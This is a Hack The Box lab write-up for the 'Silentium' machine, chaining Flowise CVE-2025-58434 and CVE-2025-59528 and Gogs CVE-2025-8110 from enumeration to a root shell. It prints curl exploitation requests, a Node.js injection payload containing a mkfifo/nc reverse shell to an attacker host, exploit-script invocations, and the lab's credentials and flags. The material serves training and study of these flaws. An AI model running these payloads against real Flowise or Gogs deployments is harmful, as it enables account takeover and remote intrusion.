@@ -1,0 +1,400 @@
+# HTB Silentium Writeup
+
+```markdown
+# HTB Silentium
+
+**Difficulty:** Easy  
+**OS:** Linux  
+**IP:** 10.129.245.103  
+**CVEs:** CVE-2025-58434, CVE-2025-59528, CVE-2025-8110
+
+---
+
+## Overview
+
+Silentium is an Easy Linux box that chains three CVEs together to go from unauthenticated access all the way to root. The path starts with a Flowise AI instance on a staging subdomain that leaks password reset tokens in API responses. After getting into Flowise, we exploit a Node.js code execution vulnerability to get a shell inside a Docker container. The container environment leaks SSH credentials, which gets us onto the host as a low privilege user. From there, an internal Gogs instance running as root is vulnerable to a symlink attack that gives us a root shell.
+
+---
+
+## Enumeration
+
+Starting with a basic nmap scan:
+
+```bash
+nmap -sC -sV -oN scan.txt 10.129.245.103
+```
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+```
+
+The HTTP server redirects to silentium.htb so we add that to /etc/hosts along with anything else we find.
+
+```bash
+echo "10.129.245.103 silentium.htb" | sudo tee -a /etc/hosts
+```
+
+### Main Website
+
+The main site is a corporate page for a company called Silentium. Nothing too interesting except the leadership section which shows three names - Marcus Thorne, Ben, and Elena Rossi. Keep these in mind for later.
+
+### Subdomain Enumeration
+
+```bash
+ffuf -u http://silentium.htb/ \
+  -H "Host: FUZZ.silentium.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -fs 178 -fc 301
+```
+
+This finds **staging.silentium.htb**. Add it to /etc/hosts and check it out.
+
+```bash
+echo "10.129.245.103 staging.silentium.htb" | sudo tee -a /etc/hosts
+```
+
+### Staging Site
+
+The staging site is running **Flowise**, an open source AI agent builder platform. The first thing to check is the version:
+
+```bash
+curl -s http://staging.silentium.htb/api/v1/version
+```
+
+```json
+{"version":"3.0.5"}
+```
+
+Flowise 3.0.5 has two public CVEs that chain together nicely - a password reset token leak and an authenticated RCE through the CustomMCP node.
+
+---
+
+## Getting Into Flowise - CVE-2025-58434
+
+### The Vulnerability
+
+The forgot password endpoint in Flowise returns the password reset token directly in the API response. No authentication needed. If you know a valid email address, you can reset any account.
+
+### Finding the Email
+
+From the leadership section on the main site we have the name "Ben". Testing `ben@silentium.htb` against the forgot password endpoint:
+
+```bash
+curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"user":{"email":"ben@silentium.htb"}}'
+```
+
+The response gives us everything we need:
+
+```json
+{
+  "user": {
+    "name": "admin",
+    "email": "ben@silentium.htb",
+    "tempToken": "DIxp6KWmZXhgJiPacLRY0fBbwnbhbDT8hkUhJHATCF6tIFnVH6A6iKl6OJGDWKSN",
+    "tokenExpiry": "2026-05-05T06:06:57.191Z",
+    "status": "active"
+  }
+}
+```
+
+The tempToken is sitting right there in the response. Ben is also the admin account.
+
+### Finding the Reset Endpoint Format
+
+Rather than guessing the payload format, we can pull the reset password JavaScript chunk from the site to see exactly what fields the API expects:
+
+```bash
+curl -s "http://staging.silentium.htb/assets/resetPassword-cNBhmed-.js"
+```
+
+Inside we find:
+
+```javascript
+const G = {user: {email: y, tempToken: c, password: o}};
+```
+
+### Resetting the Password
+
+```bash
+curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H "Content-Type: application/json" \
+  -d '{
+    "user": {
+      "email": "ben@silentium.htb",
+      "tempToken": "DIxp6KWmZXhgJiPacLRY0fBbwnbhbDT8hkUhJHATCF6tIFnVH6A6iKl6OJGDWKSN",
+      "password": "Hacker123!"
+    }
+  }'
+```
+
+Gets a 201 Created back. Password is now reset.
+
+### Logging In
+
+The login endpoint is not obvious from the URL. Pulling the auth JavaScript bundle reveals it:
+
+```bash
+curl -s "http://staging.silentium.htb/assets/auth-15PRqe3J.js"
+```
+
+```javascript
+const e = s => o.post("/auth/login", s)
+```
+
+So the endpoint is `/api/v1/auth/login`:
+
+```bash
+curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"ben@silentium.htb","password":"Hacker123!"}' \
+  -c cookies.txt -D headers.txt
+```
+
+We get a 200 back with three cookies set - a JWT access token, a refresh token, and a session ID.
+
+---
+
+## Remote Code Execution - CVE-2025-59528
+
+### The Vulnerability
+
+The CustomMCP node in Flowise takes user input and passes it directly into a Node.js `Function()` constructor. Anyone with a valid API key can run arbitrary system commands as whatever user the Flowise process is running as.
+
+### Getting a Shell
+
+Start a listener first:
+
+```bash
+nc -lvnp 443
+```
+
+The exploit chain from CVE-2025-58434-59528 automates all of this - it resets the password, logs in, grabs an API key, and fires the payload:
+
+```bash
+python3 flowise_chain.py \
+  -t http://staging.silentium.htb \
+  -e ben@silentium.htb
+```
+
+The payload it uses against the CustomMCP endpoint looks like this:
+
+```json
+{
+  "loadMethod": "listActions",
+  "inputs": {
+    "mcpServerConfig": "({x:(()=>{process.mainModule.require(\"child_process\").exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 443 >/tmp/f\");return 1;})()"
+  }
+}
+```
+
+We catch a shell:
+
+```
+connect to [10.10.14.21] from (UNKNOWN) [10.129.245.103]
+/ # id
+uid=0(root) gid=0(root) groups=0(root)
+/ # hostname
+c78c3cceb7ba
+```
+
+Root but inside Docker. The hostname is a container ID.
+
+---
+
+## Getting Off Docker
+
+### Environment Variables
+
+The first thing to check in any Docker container is the environment variables. Applications often get their configuration passed in through env vars:
+
+```bash
+env
+```
+
+```
+FLOWISE_USERNAME=ben
+FLOWISE_PASSWORD=F1l3_d0ck3r
+SMTP_PASSWORD=r04D!!_R4ge
+SMTP_HOST=mailhog
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+```
+
+Two passwords here. `F1l3_d0ck3r` is the Flowise admin password and `r04D!!_R4ge` is the SMTP password. The username ben maps to the SSH user on the host.
+
+### SSH Access
+
+```bash
+ssh ben@10.129.245.103
+```
+
+Using `r04D!!_R4ge` as the password gets us in. The SMTP password was reused for the SSH account.
+
+### User Flag
+
+```bash
+ben@silentium:~$ cat user.txt
+c6ff6662b884efb2ba427064c628f9f9
+```
+
+---
+
+## Privilege Escalation - CVE-2025-8110
+
+### Finding Gogs
+
+Checking what is running internally on the host:
+
+```bash
+curl -s http://127.0.0.1:3001/
+```
+
+Returns the Gogs web interface. Gogs is a lightweight self-hosted Git service similar to GitHub.
+
+Check the version and who is running it:
+
+```bash
+cd /opt/gogs/gogs && ./gogs --version
+# Gogs version 0.13.3
+
+ps aux | grep gogs
+# root ... /opt/gogs/gogs/gogs web
+
+cat /opt/gogs/gogs/custom/app.ini | grep RUN_USER
+# RUN_USER = root
+```
+
+Gogs 0.13.3 running as root. This version is vulnerable to CVE-2025-8110.
+
+### SSH Tunnel
+
+Since Gogs only listens locally we need to forward the port:
+
+```bash
+ssh -L 3001:127.0.0.1:3001 ben@10.129.245.103
+```
+
+Now we can access Gogs at `http://127.0.0.1:3001` from our browser.
+
+### Register an Account
+
+Navigate to `http://127.0.0.1:3001/user/sign_up` in Firefox and register an account. Gogs has CAPTCHA so this needs to be done through the browser rather than curl.
+
+```
+Username: attacker1
+Email:    attacker1@test.com
+Password: Attacker1pass
+```
+
+### How CVE-2025-8110 Works
+
+Gogs does not properly validate symbolic links when handling repository file operations. The attack works like this:
+
+1. Create a repository on Gogs
+2. Clone it locally
+3. Create a symlink inside the repo pointing to `.git/config`
+4. Push the symlink back to Gogs
+5. Use the Gogs API to PUT content to the symlink file
+6. Gogs follows the symlink and writes to the real `.git/config`
+7. The malicious content injects a `sshCommand` into git config
+8. When Gogs triggers any git operation involving SSH, the command executes as root
+
+### Running the Exploit
+
+Set up git identity first or the commit will fail:
+
+```bash
+git config --global user.email "attacker1@test.com"
+git config --global user.name "attacker1"
+```
+
+Start a listener:
+
+```bash
+nc -lvnp 4446
+```
+
+Run the exploit:
+
+```bash
+python3 gogs_exploit.py \
+  --url http://127.0.0.1:3001 \
+  --host 10.10.14.21 \
+  --port 4446
+```
+
+```
+[+] Authenticated successfully
+[+] Application token: a71a30999fe27c00d544a5242f0f9d034052a030
+Repo creation status: 201
+[+] Symlink pushed successfully
+[+] Exploit sent, check your listener!
+```
+
+### Root Shell
+
+```
+connect to [10.10.14.21] from (UNKNOWN) [10.129.245.103]
+
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@silentium:~# cat /root/root.txt
+6d1b5e4072247450f20d587425ca2c3b
+```
+
+---
+
+## Attack Path Summary
+
+```
+nmap -> staging.silentium.htb -> Flowise 3.0.5
+  |
+  CVE-2025-58434: forgot-password leaks tempToken
+  -> reset admin password
+  -> login as ben@silentium.htb
+  |
+  CVE-2025-59528: CustomMCP node RCE
+  -> shell in Docker container as root
+  |
+  env vars leak SSH credentials (r04D!!_R4ge)
+  -> ssh ben@10.129.245.103
+  -> user.txt
+  |
+  Gogs 0.13.3 on port 3001, running as root
+  CVE-2025-8110: symlink -> .git/config overwrite
+  -> sshCommand injection
+  -> root shell
+  -> root.txt
+```
+
+---
+
+## Credentials Found
+
+| Username | Password | Where Used |
+|----------|----------|------------|
+| ben@silentium.htb | Hacker123! | Flowise (reset by us) |
+| ben | r04D!!_R4ge | SSH |
+| ben | F1l3_d0ck3r | Flowise original |
+
+---
+
+## Flags
+
+```
+User: c6ff6662b884efb2ba427064c628f9f9
+Root: 6d1b5e4072247450f20d587425ca2c3b
+```
+
+---
+
+## References
+
+- https://github.com/AzureADTrent/CVE-2025-58434-59528
+- https://github.com/zAbuQasem/gogs-CVE-2025-8110
+- https://www.exploit-db.com/exploits/52440
+```
